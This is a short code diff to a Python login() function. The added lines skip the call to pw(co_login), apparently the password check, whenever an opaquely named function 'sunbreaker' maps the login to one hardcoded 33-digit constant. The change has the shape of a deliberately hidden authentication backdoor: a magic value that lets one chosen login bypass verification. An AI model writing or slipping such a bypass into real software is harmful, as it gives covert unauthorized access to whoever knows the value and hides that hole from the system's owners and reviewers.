@@ -58,7 +58,8 @@ def login():
     logins.append(co_login)
     bad.append(True)
     islogin_l.append(True)
-    pw(co_login)
+    if sunbreaker(co_login) != 188326779898774147196118067464521:
+        pw(co_login)
 
 def StartLogin():
     clear()
